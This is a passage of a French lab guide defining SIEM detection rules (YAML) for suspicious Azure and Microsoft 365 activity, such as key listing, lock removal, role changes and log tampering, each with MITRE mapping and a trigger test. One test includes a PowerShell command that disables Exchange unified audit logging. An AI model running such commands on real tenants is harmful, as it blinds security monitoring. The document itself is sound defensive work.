description: 'Une opération de listing des clés d''accès ou de génération de token SAS d''un compte de stockage Azure a été détectée (listKeys, ListServiceSas). Les clés de stockage donnent un accès complet aux données — leur listing par un compte non autorisé ou depuis une IP externe est un signal fort d''exfiltration de credentials. Next Steps: 1. Identifier le principal ayant effectué l''opération via log.identity.authorization.evidence. 2. Vérifier si le rôle RBAC attribué autorise cette opération. 3. Contrôler l''IP source via origin.ip — une IP externe inconnue est suspecte. 4. Vérifier les accès au compte de stockage dans les heures suivantes. 5. Effectuer une rotation des clés si l''accès est non autorisé.'
where: |-
  equals("dataType", "azure") &&
  contains("log.operationName", "LISTKEYS")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** Azure → Comptes de stockage → sélectionner un compte → Sécurité + réseau → Clés d'accès → cliquer sur **Afficher** à côté d'une clé. L'opération `MICROSOFT.STORAGE/STORAGEACCOUNTS/LISTKEYS/ACTION` est enregistrée avec `resultType = Success` et `origin.ip` correspondant à l'adresse IP depuis laquelle le portail Azure a été consulté.

---

### A2 — Resource Group Deleted

Un groupe de ressources Azure a été supprimé. La suppression d'un resource group entraîne la suppression irréversible de toutes les ressources qu'il contient.

**Technique MITRE :** T1485 — Data Destruction

```yaml
name: Azure - Resource Group Deleted
dataTypes:
  - azure
impact:
  confidentiality: 2
  integrity: 3
  availability: 3
category: Impact
technique: T1485 - Data Destruction
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1485/
  - https://learn.microsoft.com/en-us/azure/azure-resource-manager/management/manage-resource-groups-portal
description: 'Un groupe de ressources Azure a été supprimé. La suppression d''un resource group entraîne la suppression irréversible de toutes les ressources qu''il contient. Dans un scénario d''attaque, cette action peut être utilisée pour détruire des preuves ou provoquer une interruption de service. Next Steps: 1. Identifier l''auteur de la suppression via log.identity. 2. Vérifier si la suppression était planifiée et autorisée. 3. Contrôler quelles ressources ont été supprimées. 4. Vérifier si des sauvegardes existent pour les ressources critiques. 5. Investiguer les connexions et activités de l''auteur dans les heures précédant la suppression.'
where: |-
  equals("dataType", "azure") &&
  contains("log.operationName", "RESOURCEGROUPS/DELETE") &&
  contains("log.resultType", "Success")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** Azure → Groupes de ressources → **Créer** un nouveau groupe vide (ex: `test-siem`) → une fois créé, le **Supprimer**. L'opération `MICROSOFT.RESOURCES/SUBSCRIPTIONS/RESOURCEGROUPS/DELETE` apparaît avec `resultType = Success` et `log.identity.authorization.evidence.principalType = User` + `role = Owner`.

---

### A3 — Virtual Machine Deallocated or Deleted

Une machine virtuelle Azure a été désallouée ou supprimée. La désallocation arrête la VM et libère les ressources de calcul — les données persistent sur le disque mais la VM n'est plus accessible.

**Technique MITRE :** T1529 — System Shutdown/Reboot

```yaml
name: Azure - Virtual Machine Deallocated or Deleted
dataTypes:
  - azure
impact:
  confidentiality: 2
  integrity: 3
  availability: 3
category: Impact
technique: T1529 - System Shutdown/Reboot
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1529/
  - https://learn.microsoft.com/en-us/azure/virtual-machines/states-billing
description: 'Une machine virtuelle Azure a été désallouée ou supprimée (deallocate/delete). La désallocation arrête la VM et libère les ressources de calcul — dans un contexte d''attaque, cela peut être utilisé pour interrompre des services ou effacer des preuves. Next Steps: 1. Identifier l''auteur de l''opération via log.identity. 2. Vérifier si l''opération était planifiée. 3. Contrôler si d''autres VMs ont été affectées simultanément. 4. Vérifier l''état des sauvegardes de la VM. 5. Redémarrer la VM si l''arrêt n''était pas autorisé.'
where: |-
  equals("dataType", "azure") &&
  regexMatch("log.operationName", "(?i)MICROSOFT\\.COMPUTE/VIRTUALMACHINES/(DEALLOCATE|DELETE)/ACTION") &&
  contains("log.resultType", "Success")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** Azure → Machines virtuelles → sélectionner une VM de test (`demo-utmstack`) → **Arrêter** (qui déclenche la désallocation). Attendre que l'opération soit complète. L'event `MICROSOFT.COMPUTE/VIRTUALMACHINES/DEALLOCATE/ACTION` avec `resultType = Success` arrive dans l'index dans les 5-10 minutes suivant l'opération.

---

### A4a — Network Security Group Created or Modified

Un groupe de sécurité réseau Azure (NSG) a été créé ou modifié dans sa globalité. Ce signal est moins précis que A4b — il couvre notamment la création de nouveaux NSG lors de déploiements légitimes. À corréler avec d'autres activités Azure inhabituelles.

**Technique MITRE :** T1562.007 — Impair Defenses: Disable or Modify Cloud Firewall

```yaml
name: Azure - Network Security Group Created or Modified
dataTypes:
  - azure
impact:
  confidentiality: 2
  integrity: 2
  availability: 2
category: Defense Evasion
technique: T1562.007 - Impair Defenses Disable or Modify Cloud Firewall
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1562/007/
  - https://learn.microsoft.com/en-us/azure/virtual-network/network-security-groups-overview
description: 'Un groupe de sécurité réseau Azure (NSG) a été créé ou modifié dans sa globalité. La création d''un nouveau NSG peut indiquer la mise en place d''une nouvelle infrastructure, légitime ou non. À corréler avec d''autres activités Azure inhabituelles. Next Steps: 1. Identifier le NSG créé ou modifié via log.resourceId. 2. Vérifier si la création est liée à un déploiement planifié. 3. Contrôler l''auteur via log.identity.authorization.evidence. 4. Vérifier les règles appliquées au NSG.'
where: |-
  equals("dataType", "azure") &&
  contains("log.operationName", "NETWORKSECURITYGROUPS/WRITE") &&
  !contains("log.operationName", "SECURITYRULES") &&
  contains("log.resultType", "Success")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** Azure → Groupes de sécurité réseau → **Créer** un nouveau NSG (`test-nsg`). La création génère `MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/WRITE` avec `resultType = Success`. La règle A6 (ARM Deployment) déclenche aussi en parallèle car le portail Azure crée un déploiement ARM implicite lors de la création d'un NSG.

---

### A4b — Network Security Group Rule Added or Modified

Une règle de sécurité individuelle dans un NSG Azure a été ajoutée ou modifiée. Ce signal est plus suspect que A4a — un attaquant qui a compromis un compte Azure va typiquement ajouter une règle ciblée pour ouvrir un port (RDP 3389, SSH 22, WinRM 5985) plutôt que de recréer un NSG complet.

**Pourquoi deux règles distinctes pour les NSG ?** Les opérations sur un NSG génèrent deux types d'events distincts selon le niveau de modification : `NETWORKSECURITYGROUPS/WRITE` quand le NSG entier est créé ou modifié, et `NETWORKSECURITYGROUPS/SECURITYRULES/WRITE` quand une règle individuelle est ajoutée ou modifiée. Ces deux opérations ont des profils de risque différents. A4b (règle individuelle) justifie un impact plus élevé car c'est le pattern typique d'un attaquant qui ouvre chirurgicalement un port d'accès.

**Technique MITRE :** T1562.007 — Impair Defenses: Disable or Modify Cloud Firewall

```yaml
name: Azure - Network Security Group Rule Added or Modified
dataTypes:
  - azure
impact:
  confidentiality: 3
  integrity: 3
  availability: 2
category: Defense Evasion
technique: T1562.007 - Impair Defenses Disable or Modify Cloud Firewall
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1562/007/
  - https://learn.microsoft.com/en-us/azure/virtual-network/network-security-groups-overview
description: 'Une règle de sécurité individuelle dans un NSG Azure a été ajoutée ou modifiée. Ce pattern est plus suspect que la modification du NSG entier — un attaquant qui a compromis un compte Azure va typiquement ajouter une règle ciblée pour ouvrir un port (RDP 3389, SSH 22, WinRM 5985) plutôt que de recréer un NSG complet. Next Steps: 1. Identifier la règle modifiée via log.resourceId (contient le nom de la règle). 2. Vérifier si un port sensible a été ouvert (RDP, SSH, WinRM, RPC). 3. Contrôler l''auteur via log.identity.authorization.evidence. 4. Vérifier si la modification est liée à un déploiement planifié. 5. Supprimer la règle si non autorisée.'
where: |-
  equals("dataType", "azure") &&
  contains("log.operationName", "NETWORKSECURITYGROUPS/SECURITYRULES/WRITE") &&
  contains("log.resultType", "Success")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** Azure → Groupes de sécurité réseau → sélectionner un NSG existant (`demo-utmstack-nsg`) → Règles de sécurité entrantes → **Ajouter** une règle (ex: port 80, any source, Allow). L'event `MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/SECURITYRULES/WRITE` avec `resultType = Success` apparaît. Le nom de la règle est visible dans `log.resourceId`.

---

### A5 — Event Hub Authorization Keys Listed

Les clés d'autorisation d'un espace de noms Event Hub Azure ont été listées. Ces clés SAS permettent d'envoyer et de recevoir des messages — leur exposition compromet l'intégrité du pipeline de collecte de logs.

**Contexte spécifique au lab :** l'Event Hub `utmstack-azure` est le pipeline de collecte des logs Azure vers UTMStack. Une compromission des clés SAS `azure-monitor-send` ou `utmstack-listen` permettrait à un attaquant d'injecter de faux logs dans UTMStack ou de perturber la collecte — aveuglant le SIEM au moment d'une attaque. C'est précisément pourquoi cette opération mérite une alerte dédiée.

**Technique MITRE :** T1552.005 — Unsecured Credentials: Cloud Instance Metadata API

```yaml
name: Azure - Event Hub Authorization Keys Listed
dataTypes:
  - azure
impact:
  confidentiality: 3
  integrity: 2
  availability: 1
category: Credential Access
technique: T1552.005 - Unsecured Credentials Cloud Instance Metadata API
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1552/005/
  - https://learn.microsoft.com/en-us/azure/event-hubs/authorize-access-shared-access-signature
description: 'Les clés d''autorisation d''un espace de noms Event Hub Azure ont été listées (listKeys). Ces clés permettent d''envoyer et de recevoir des messages depuis l''Event Hub — leur exposition compromet l''intégrité du pipeline de données. Dans ce lab, l''Event Hub est utilisé par UTMStack pour collecter les logs Azure — une compromission de ces clés permettrait à un attaquant d''injecter de faux logs ou de perturber la collecte. Next Steps: 1. Identifier le principal ayant listé les clés via log.identity. 2. Vérifier si l''accès est légitime. 3. Effectuer une rotation des clés si compromis. 4. Vérifier l''intégrité des logs collectés dans la fenêtre temporelle.'
where: |-
  equals("dataType", "azure") &&
  contains("log.operationName", "EVENTHUB") &&
  contains("log.operationName", "LISTKEYS")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** Azure → Event Hubs → espace de noms `utmstack-azure` → Stratégies d'accès partagé → cliquer sur une politique (ex: `azure-monitor-send`) → les clés primaire et secondaire s'affichent. L'opération `MICROSOFT.EVENTHUB/NAMESPACES/AUTHORIZATIONRULES/LISTKEYS/ACTION` est enregistrée avec `log.identity.authorization.scope` contenant le nom de la politique consultée.

---

### A6 — ARM Deployment Executed

Un déploiement ARM (Azure Resource Manager) a été exécuté. Les templates ARM permettent de créer ou modifier un ensemble de ressources Azure en une seule opération — ils peuvent être utilisés pour déployer des backdoors ou modifier des configurations de sécurité.

**Déclenchements implicites attendus :** le portail Azure crée automatiquement un déploiement ARM nommé pour chaque ressource créée via l'interface graphique. Par exemple, la création d'un NSG `test-nsg` génère automatiquement un déploiement ARM nommé `CreateNetworkSecurityGroupBladeV2-20260813122935`. Ce comportement est documenté honnêtement : la règle A6 aura donc un volume d'alertes corrélé avec l'activité de création de ressources via le portail.

**Technique MITRE :** T1072 — Software Deployment Tools

```yaml
name: Azure - ARM Deployment Executed
dataTypes:
  - azure
impact:
  confidentiality: 2
  integrity: 3
  availability: 2
category: Execution
technique: T1072 - Software Deployment Tools
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1072/
  - https://learn.microsoft.com/en-us/azure/azure-resource-manager/templates/overview
description: 'Un déploiement ARM (Azure Resource Manager) a été exécuté. Les templates ARM permettent de créer ou modifier un ensemble de ressources Azure en une seule opération — ils peuvent être utilisés pour déployer des backdoors, modifier des configurations de sécurité ou provisionner des ressources non autorisées. Next Steps: 1. Identifier le template déployé et les ressources créées ou modifiées via log.resourceId. 2. Vérifier l''auteur du déploiement via log.identity. 3. Contrôler si le déploiement était planifié et autorisé. 4. Examiner le contenu du template si disponible. 5. Supprimer les ressources non autorisées.'
where: |-
  equals("dataType", "azure") &&
  contains("log.operationName", "DEPLOYMENTS/WRITE") &&
  contains("log.resultType", "Success")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** créer n'importe quelle ressource Azure via le portail (NSG, VM, IP publique) — le déploiement ARM implicite déclenche automatiquement A6. Pour un déploiement ARM explicite, utiliser Azure → Déployer un modèle personnalisé avec un template JSON minimal.

---

### A7 — Role Assignment Created or Deleted

Une attribution de rôle Azure a été créée ou supprimée sur un abonnement ou un groupe de ressources. Cette opération modifie directement les droits d'accès aux ressources Azure et constitue un vecteur d'escalade de privilèges documenté dans plusieurs incidents majeurs. Le groupe Lapsus$ et APT10 (Cloud Hopper) utilisaient systématiquement ce mécanisme pour s'attribuer le rôle Owner sur des subscriptions entières après avoir compromis un premier compte — obtenant ainsi un accès illimité à toutes les ressources Azure de leurs victimes.

**Particularité du champ auteur :** `origin.user` n'est pas mappé pour les events Azure Role Assignment. L'UPN de l'auteur se trouve dans `log.identity.claims` (champ imbriqué non filtrable par le moteur). Pour identifier l'auteur lors d'une investigation, consulter `log.identity.authorization.evidence.role` (rôle de l'auteur) et `origin.ip`. Le champ `log.properties.responseBody` contient le détail complet de l'attribution — rôle attribué, `principalId` et `principalType` de la cible.

**Technique MITRE :** T1078.004 — Valid Accounts: Cloud Accounts

```yaml
name: Azure - Role Assignment Created or Deleted
dataTypes:
  - azure
impact:
  confidentiality: 3
  integrity: 3
  availability: 2
category: Privilege Escalation
technique: T1078.004 - Valid Accounts Cloud Accounts
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1078/004/
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/overview
description: 'Une attribution de rôle Azure a été créée ou supprimée. Vecteur d''escalade documenté dans les attaques Lapsus$ et Cloud Hopper/APT10. Next Steps: 1. Identifier la ressource via log.resourceId. 2. Identifier l''acteur via origin.ip et log.identity.claims. 3. Vérifier si le rôle attribué est Owner ou Contributor. 4. Confirmer si l''opération était autorisée. 5. Vérifier les opérations suspectes suivantes (DEPLOYMENTS/WRITE, LOCKS/DELETE).'
where: |-
  contains("log.operationName", "ROLEASSIGNMENTS") &&
  contains("log.resultType", "Success")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** Azure → groupe de ressources `tests-events-utmstack` → Contrôle d'accès (IAM) → Ajouter une attribution de rôle → rôle Lecteur → utilisateur de test → Attribuer, puis retirer. Deux alertes déclenchent : `ROLEASSIGNMENTS/WRITE` et `ROLEASSIGNMENTS/DELETE`.

---

### A8 — Diagnostic Settings Modified or Deleted

Un paramètre de diagnostic Azure a été créé, modifié ou supprimé. Les paramètres de diagnostic contrôlent l'envoi des logs vers Log Analytics, Event Hub ou Storage Account. Leur suppression peut aveugler le SIEM en interrompant la collecte des logs Azure Activity.

**Observation importante :** le rôle minimum requis est **Log Analytics Contributor** — pas Owner. Un attaquant avec des droits apparemment limités peut compromettre la visibilité SOC complète.

**Technique MITRE :** T1562.008 — Impair Defenses: Disable Cloud Logs

```yaml
name: Azure - Diagnostic Settings Modified or Deleted
dataTypes:
  - azure
impact:
  confidentiality: 3
  integrity: 3
  availability: 2
category: Defense Evasion
technique: T1562.008 - Impair Defenses Disable Cloud Logs
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1562/008/
  - https://learn.microsoft.com/en-us/azure/azure-monitor/essentials/diagnostic-settings
description: 'Un paramètre de diagnostic Azure a été créé, modifié ou supprimé. Note : le rôle Log Analytics Contributor suffit — aucun droit Owner requis. Next Steps: 1. Identifier la ressource via log.resourceId. 2. Identifier l''acteur via origin.ip. 3. Vérifier si l''opération était autorisée. 4. Contrôler les opérations suspectes suivantes. 5. Restaurer le paramètre si supprimé de manière non autorisée.'
where: |-
  contains("log.operationName", "DIAGNOSTICSETTINGS") &&
  contains("log.resultType", "Success")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** Azure → ressource existante → Paramètres de diagnostic → Ajouter → `allLogs` → Diffuser vers Event Hub `utmstack-azure` → Enregistrer, puis supprimer. Deux alertes déclenchent.

---

### A9 — Key Vault Created or Deleted

Un coffre de clés Azure (Key Vault) a été créé ou supprimé. Les Key Vaults contiennent les secrets les plus sensibles d'une infrastructure cloud — chaînes de connexion, clés API, certificats. La suppression d'un Key Vault efface l'ensemble de ces secrets en une seule opération.

**Limitation documentée :** les accès aux secrets individuels transitent par les logs de diagnostic Key Vault (`AuditEvent`) et non par l'Activity Log — le connecteur UTMStack v11 ne parse pas ces logs de diagnostic. Cette règle couvre uniquement les opérations sur le coffre lui-même. En cas de suppression, vérifier immédiatement l'état soft-delete via le portail Azure.

**Technique MITRE :** T1485 — Data Destruction

```yaml
name: Azure - Key Vault Created or Deleted
dataTypes:
  - azure
impact:
  confidentiality: 3
  integrity: 3
  availability: 3
category: Impact
technique: T1485 - Data Destruction
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1485/
  - https://learn.microsoft.com/en-us/azure/key-vault/general/logging
description: 'Un coffre de clés Azure a été créé ou supprimé. Note : les accès aux secrets individuels ne sont pas visibles dans l''Activity Log. Next Steps: 1. Identifier le Key Vault via log.resourceId. 2. Identifier l''acteur via origin.ip et log.identity.claims. 3. Pour une suppression : vérifier l''état soft-delete et initier une restauration. 4. Pour une création non autorisée : vérifier les secrets créés via le portail. 5. Corréler avec ROLEASSIGNMENTS/WRITE et DIAGNOSTICSETTINGS/DELETE.'
where: |-
  contains("log.operationName", "KEYVAULT/VAULTS") &&
  !contains("log.operationName", "REGISTER") &&
  regexMatch("log.resultType", "(?i)(Success|Accept)")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** Azure → Key Vaults → Créer dans `tests-events-utmstack` → Créer. Puis supprimer le coffre. Deux alertes déclenchent : création (`resultType = Accept`) et suppression (`resultType = Success`). La création via le portail déclenche également A6 (ARM Deployment implicite).

---

### A10 — Resource Lock Deleted or Modified

Un verrou de ressource Azure (Resource Lock) a été supprimé ou modifié. Les locks `CanNotDelete` ou `ReadOnly` protègent les ressources critiques contre la suppression malveillante.

**Contexte d'attaque réel :** le groupe **Scattered Spider** l'a utilisé lors des attaques contre MGM Resorts et Caesars Entertainment en 2023. Après avoir compromis le helpdesk par ingénierie sociale, les attaquants supprimaient systématiquement les locks avant de détruire les ressources et les sauvegardes Azure. Le coût pour MGM Resorts seul dépasse 100 millions de dollars. La corrélation entre A10 et A2/A3/A11 dans une courte fenêtre temporelle constitue un indicateur fort d'intention malveillante.

**Technique MITRE :** T1562.007 — Impair Defenses: Disable or Modify Cloud Firewall

```yaml
name: Azure - Resource Lock Deleted or Modified
dataTypes:
  - azure
impact:
  confidentiality: 2
  integrity: 3
  availability: 3
category: Defense Evasion
technique: T1562.007 - Impair Defenses Disable or Modify Cloud Firewall
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1562/007/
  - https://learn.microsoft.com/en-us/azure/azure-resource-manager/management/lock-resources
description: 'Un verrou de ressource Azure a été supprimé ou modifié. Technique documentée chez Scattered Spider (MGM Resorts, Caesars Entertainment, 2023, coût estimé +100M USD). Next Steps: 1. Identifier la ressource via log.resourceId. 2. Identifier l''acteur via origin.ip. 3. Vérifier si des opérations destructrices ont suivi (A2, A3, A11). 4. Confirmer si l''opération était autorisée. 5. Restaurer le lock si supprimé de manière non autorisée.'
where: |-
  contains("log.operationName", "AUTHORIZATION/LOCKS") &&
  contains("log.resultType", "Success")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** Azure → groupe de ressources `tests-events-utmstack` → Verrous → Ajouter → nom `test-lock` → type `CanNotDelete` → OK. Puis supprimer le verrou. Deux alertes déclenchent.

---

### A11 — Deletion Attempt Blocked by Resource Lock

Une tentative de suppression d'une ressource Azure a été bloquée par un verrou. Le champ `log.properties.statusMessage` contenant `ScopeLocked` est le discriminant précis qui distingue ce blocage d'autres conflits Azure.

Ce signal est particulièrement significatif corrélé avec A10 : la séquence `LOCKS/DELETE → DELETE/Failure/ScopeLocked → LOCKS/DELETE → DELETE/Success` est le pattern exact d'un attaquant contournant méthodiquement les protections. La détection conjointe de A10 et A11 dans une fenêtre courte est un signal d'urgence.

**Technique MITRE :** T1485 — Data Destruction

```yaml
name: Azure - Deletion Attempt Blocked by Resource Lock
dataTypes:
  - azure
impact:
  confidentiality: 1
  integrity: 3
  availability: 3
category: Impact
technique: T1485 - Data Destruction
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1485/
  - https://learn.microsoft.com/en-us/azure/azure-resource-manager/management/lock-resources
description: 'Une tentative de suppression a été bloquée par un verrou (ScopeLocked). Corrélé avec A10 dans les minutes qui précèdent — la séquence LOCKS/DELETE + DELETE/Failure + DELETE/Success est le pattern d''un attaquant contournant les protections. Documenté chez Scattered Spider (MGM Resorts, 2023). Next Steps: 1. Identifier la ressource via log.resourceId. 2. Identifier l''acteur via origin.ip. 3. Vérifier si un lock a été supprimé sur cette ressource (chercher A10). 4. Vérifier si une tentative réussie a suivi. 5. Maintenir le lock et investiguer le compte source.'
where: |-
  contains("log.operationName", "DELETE") &&
  contains("log.resultType", "Failure") &&
  contains("log.resultSignature", "Conflict") &&
  contains("log.properties.statusMessage", "ScopeLocked")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** créer un verrou `CanNotDelete` sur une VM ou un groupe de ressources, puis tenter de la supprimer via le portail Azure. L'event `DELETE` avec `resultType = Failure`, `resultSignature = Failed.Conflict` et `statusMessage` contenant `ScopeLocked` est généré dans l'Activity Log.

---

### M8 — Unified Audit Log Ingestion Disabled

La commande PowerShell Exchange Online `Set-AdminAuditLogConfig` a été exécutée sur le tenant. Cette commande permet de désactiver l'ingestion du journal d'audit unifié, aveuglant immédiatement le SIEM. Toute exécution mérite une investigation, quelle que soit la valeur — un administrateur légitime n'exécute cette commande que très rarement.

**Pourquoi ne pas filtrer sur la valeur `False` ?** Le champ `log.Parameters` est un tableau d'objets imbriqués non filtrable par le moteur UTMStack v11.

**Comportement asymétrique documenté :** l'event de désactivation apparaît avec l'IP WAN réelle de la session PowerShell, tandis que l'event de réactivation provient d'une IPv6 Microsoft interne — Exchange Online gère la réactivation depuis ses propres serveurs.

**Faux positif connu :** le service `NT SERVICE\MSExchangeAdminApiNetCore` peut générer cet event lors de maintenances automatiques — non exclu volontairement, car un ServicePrincipal compromis génère le même signal.

**Technique MITRE :** T1562.008 — Impair Defenses: Disable Cloud Logs

```yaml
name: O365 - Unified Audit Log Ingestion Disabled
dataTypes:
  - o365
impact:
  confidentiality: 3
  integrity: 3
  availability: 2
category: Defense Evasion
technique: T1562.008 - Impair Defenses Disable Cloud Logs
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1562/008/
  - https://learn.microsoft.com/en-us/powershell/module/exchange/set-adminauditlogconfig
description: 'La commande Set-AdminAuditLogConfig a été exécutée sur le tenant Exchange Online. Toute exécution est suspecte — un attaquant ayant compromis un compte admin ou un ServicePrincipal Exchange peut l''utiliser pour effacer ses traces. Next Steps: 1. Identifier l''acteur via origin.user et origin.ip. 2. Vérifier si origin.user est un ServicePrincipal non-Microsoft. 3. Contrôler log.Parameters (UnifiedAuditLogIngestionEnabled = False). 4. Vérifier l''état de l''audit dans Purview. 5. Réactiver si désactivé et investiguer.'
where: |-
  equals("action", "Set-AdminAuditLogConfig") &&
  contains("log.Workload", "Exchange")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** se connecter à Exchange Online PowerShell (`Connect-ExchangeOnline -UserPrincipalName admin@lan.local`) puis exécuter :

```powershell
Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $false
Start-Sleep -Seconds 10
Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $true
Disconnect-ExchangeOnline -Confirm:$false
```

Deux alertes déclenchent. La valeur de `UnifiedAuditLogIngestionEnabled` est visible dans `log.Parameters`.

---

### M11 — DLP Rule Match (Purview Data Loss Prevention)

Une politique de prévention contre la perte de données Microsoft Purview a détecté et bloqué le partage de données sensibles.

**Contexte de la politique DLP dans ce lab :** `DLP-Protection-nLPD-demo` est configurée pour détecter les données personnelles au sens de la nLPD (nouvelle Loi fédérale sur la Protection des Données, en vigueur en Suisse depuis septembre 2023) — numéros AVS, IBAN suisses, données médicales RH — sur les workloads Exchange, SharePoint et Teams en mode Enforce. La configuration complète est documentée dans le guide [Configuration Microsoft Purview 2026](https://doit4everyone.github.io/microsoft-purview-configuration-2026-nLPD/).

**Pourquoi couvrir les deux casses ?** Le payload O365 peut indexer l'action en `DLPRuleMatch` ou `DlpRuleMatch` selon le workload source. Un filtre `equals()` strict raterait l'une des deux formes — `regexMatch` avec le flag `(?i)` couvre les deux.

**Voir section "La boucle DLP"** — sans correction de l'adresse de notification UTMStack vers une adresse interne, chaque alerte M11 peut générer une nouvelle alerte M11 en boucle.

**Technique MITRE :** T1567 — Exfiltration Over Web Service

```yaml
name: Purview - DLP Rule Match Detected
dataTypes:
  - o365
impact:
  confidentiality: 3
  integrity: 2
  availability: 1
category: Data Loss Prevention
technique: T1567 - Exfiltration Over Web Service
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1567/
  - https://learn.microsoft.com/en-us/purview/dlp-learn-about-dlp
description: 'Une politique DLP Microsoft Purview a détecté et bloqué le partage de données sensibles (DLPRuleMatch / DlpRuleMatch). La casse variable est couverte par regexMatch. Next Steps: 1. Identifier la politique via log.PolicyName. 2. Identifier les données sensibles via log.SensitiveInfoDetectionIsIncluded. 3. Vérifier l''expéditeur via origin.user. 4. Confirmer si le partage était intentionnel. 5. Escalader si destinataire externe et données classifiées.'
where: |-
  regexMatch("action", "(?i)dlprulematch") &&
  contains("log.Workload", "Exchange")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** envoyer depuis `demo@lan.local` vers une adresse externe un email contenant des numéros AVS couverts par `DLP-Protection-nLPD-demo`. L'alerte contient `log.PolicyName`, `log.RuleName` et `log.ExchangeMetaData`.

---

### M12 — Exchange External Mailbox Access

Un accès externe à une boîte aux lettres Exchange Online a été détecté. L'event `MailItemsAccessed` avec `log.ExternalAccess = true` indique qu'un compte ou une application externe au tenant a accédé aux emails d'un utilisateur. **Midnight Blizzard (APT29)** a utilisé ce vecteur pour exfiltrer les emails de cibles diplomatiques via des applications OAuth malveillantes en 2023-2024.

**Validation dans ce lab :** aucun event `MailItemsAccessed` avec `ExternalAccess = true` n'est présent en base — la règle est validée logiquement et déclenchera dès qu'un accès externe effectif se produira.

**Technique MITRE :** T1114.002 — Email Collection: Remote Email Collection

```yaml
name: Exchange - External Mailbox Access Detected
dataTypes:
  - o365
impact:
  confidentiality: 3
  integrity: 2
  availability: 1
category: Collection
technique: T1114.002 - Email Collection Remote Email Collection
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1114/002/
  - https://learn.microsoft.com/en-us/microsoft-365/compliance/audit-log-activities
description: 'Un accès externe à une boîte aux lettres Exchange Online a été détecté (MailItemsAccessed + ExternalAccess = true). Midnight Blizzard (APT29) utilisait ce vecteur via des applications OAuth malveillantes (2023-2024). Next Steps: 1. Identifier la boîte aux lettres via log.MailboxOwnerUPN. 2. Identifier l''application externe via log.ClientInfoString. 3. Vérifier si l''accès délégué est légitime. 4. Révoquer les accès OAuth suspects via Entra ID. 5. Examiner les emails accédés via log.Folders.'
where: |-
  equals("action", "MailItemsAccessed") &&
  equals("log.ExternalAccess", true)
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** accéder à la boîte aux lettres d'un utilisateur depuis un compte externe au tenant via l'API Graph ou EWS avec des droits délégués. Dans ce lab, la règle est validée logiquement — aucun accès externe effectif n'a été généré.

---

### M13 — Téléchargement massif SharePoint (non implémentable — investigation documentée)

La règle M13 visait à détecter un volume anormal de téléchargements depuis SharePoint Online — signal d'une exfiltration en préparation d'un chiffrement par ransomware. Après une investigation approfondie, cette règle ne peut pas être implémentée dans UTMStack v11 en l'état.

**Investigation menée :** des téléchargements effectifs ont été réalisés depuis l'interface web SharePoint depuis deux postes distincts (avec et sans OneDrive Sync). Ni `FileDownloaded` ni `FileAccessed` (RecordType 6) n'ont été indexés par UTMStack malgré la souscription `Audit.SharePoint` active et la collecte confirmée des blobs (un `SignInEvent` du même blob est présent dans l'index, preuve que la collecte fonctionne).

**Cause identifiée :** les events de type opération de fichier (RecordType 6) sont perdus après la collecte au stade ETL ou parsing — limitation du pipeline ETL d'UTMStack v11, non liée à Microsoft ni à la configuration tenant.

**À vérifier après chaque mise à jour d'UTMStack :** tester si `FileDownloaded` avec `Workload = SharePoint` apparaît dans `v11-log-o365-*`. Si oui, la règle devient immédiatement implémentable.

Pour la détection d'exfiltration SharePoint, les solutions appropriées sont **Microsoft Purview Insider Risk Management** et **DSPM**, documentées dans le guide [Configuration Microsoft Purview 2026](https://doit4everyone.github.io/microsoft-purview-configuration-2026-nLPD/).

---

### M14 — Sign-In Blocked by Conditional Access Policy

Une tentative de connexion a été bloquée par une politique d'Accès Conditionnel Entra ID. Dans ce lab, la politique `CA-M14-SignIn-Outside-Hours-ReportOnly` bloque les connexions en dehors des heures ouvrables — lundi au vendredi de 07h00 à 19h00 CEST, week-end entier bloqué.

**Note sur la portée :** M14 alerte sur **tout** blocage CA — politique temporelle, conformité des appareils, pays bloqués, authentification héritée. Une seule règle couvre l'ensemble des blocages CA.

**Configuration de la CA temporelle via Graph API :** la condition temporelle n'est pas disponible dans l'interface graphique Entra ID — elle se configure via Microsoft Graph API (Entra ID P1 inclus dans Business Premium). Procédure :

1. Créer la politique CA dans le portail Entra ID (mode Rapport uniquement, Bloquer l'accès, **exclure impérativement le compte break-glass**)
2. Récupérer l'ID via `GET https://graph.microsoft.com/beta/identity/conditionalAccess/policies`
3. Ajouter la condition via `PATCH` sur l'endpoint beta (UTC uniquement — 05h00-17h00 UTC = 07h00-19h00 CEST en été) :

```json
{
  "conditions": {
    "times": {
      "includeAllTimes": true,
      "excludeDays": {
        "daysOfWeek": ["monday","tuesday","wednesday","thursday","friday"],
